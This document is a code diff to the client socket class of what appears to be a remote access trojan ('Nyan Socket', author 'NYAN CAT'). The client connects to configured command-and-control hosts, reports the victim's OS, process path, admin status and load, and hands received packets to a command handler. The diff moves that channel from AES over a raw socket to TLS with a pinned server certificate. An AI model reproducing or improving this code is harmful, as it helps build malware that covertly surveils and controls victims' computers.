@@ -9,6 +9,9 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Text;
 using System.Security.Principal;
+using System.Net.Security;
+using System.Security.Authentication;
+using System.Security.Cryptography.X509Certificates;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Nyan Socket v0.1
@@ -18,9 +21,10 @@ using System.Security.Principal;
 
 namespace Client.Sockets
 {
-   public static class ClientSocket
+    public static class ClientSocket
     {
         public static Socket Client { get; set; }
+        public static SslStream SslClient { get; set; }
         private static byte[] Buffer { get; set; }
         private static long Buffersize { get; set; }
         private static Timer Tick { get; set; }
@@ -39,15 +43,20 @@ namespace Client.Sockets
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
                 };
-                Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]),
+                Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
                     Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
-                Debug.WriteLine("Connected!");
-                IsConnected = true;
-                Buffer = new byte[4];
-                MS = new MemoryStream();
-                Send(SendInfo());
-                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
-                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                if (Client.Connected)
+                {
+                    Debug.WriteLine("Connected!");
+                    IsConnected = true;
+                    SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
+                    SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                    Buffer = new byte[4];
+                    MS = new MemoryStream();
+                    Send(SendInfo());
+                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                }
             }
             catch
             {
@@ -56,12 +65,21 @@ namespace Client.Sockets
             }
         }
 
+        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+        {
+#if DEBUG
+            return true;
+#endif
+            return Settings.ServerCertificate.Equals(certificate);
+        }
+
         public static void Reconnect()
         {
 
             try
             {
                 Tick?.Dispose();
+                SslClient?.Dispose();
                 Client?.Dispose();
                 MS?.Dispose();
             }
@@ -81,7 +99,7 @@ namespace Client.Sockets
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
-            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Administrator").Replace("false","User");
+            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Administrator").Replace("false", "User");
             TheCPUCounter.NextValue();
             msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
             return msgpack.Encode2Bytes();
@@ -96,40 +114,42 @@ namespace Client.Sockets
                     IsConnected = false;
                     return;
                 }
-
-                int recevied = Client.EndReceive(ar);
-                if (recevied == 4)
+                int recevied = SslClient.EndRead(ar);
+                if (recevied > 0)
                 {
                     MS.Write(Buffer, 0, recevied);
-                    Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
-                    Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
-                    MS.Dispose();
-                    MS = new MemoryStream();
-                    if (Buffersize > 0)
+                    if (MS.Length == 4)
                     {
-                        Buffer = new byte[Buffersize];
-                        while (MS.Length != Buffersize)
+                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
+                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
+                        MS.Dispose();
+                        MS = new MemoryStream();
+                        if (Buffersize > 0)
                         {
-                            int rc = Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
-                            if (rc == 0)
+                            Buffer = new byte[Buffersize];
+                            while (MS.Length != Buffersize)
                             {
-                                IsConnected = false;
-                                return;
+                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
+                                if (rc == 0)
+                                {
+                                    IsConnected = false;
+                                    return;
+                                }
+                                MS.Write(Buffer, 0, rc);
+                                Buffer = new byte[Buffersize - MS.Length];
                             }
-                            MS.Write(Buffer, 0, rc);
-                            Buffer = new byte[Buffersize - MS.Length];
+                            if (MS.Length == Buffersize)
+                            {
+                                ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
+                                Buffer = new byte[4];
+                                MS.Dispose();
+                                MS = new MemoryStream();
+                            }
+                            else
+                                Buffer = new byte[Buffersize - MS.Length];
                         }
-                        if (MS.Length == Buffersize)
-                        {
-                            ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
-                            Buffer = new byte[4];
-                            MS.Dispose();
-                            MS = new MemoryStream();
-                        }
-                        else
-                            Buffer = new byte[Buffersize - MS.Length];
                     }
-                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                 }
                 else
                 {
@@ -158,12 +178,13 @@ namespace Client.Sockets
 
                     if (msg == null) return;
 
-                    byte[] buffer = Settings.aes256.Encrypt(msg);
+                    byte[] buffer = msg;
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
                     Client.Poll(-1, SelectMode.SelectWrite);
-                    Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
-                    Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                    SslClient.Write(buffersize, 0, buffersize.Length);
+                    SslClient.Write(buffer, 0, buffer.Length);
+                    SslClient.Flush();
                 }
                 catch
                 {
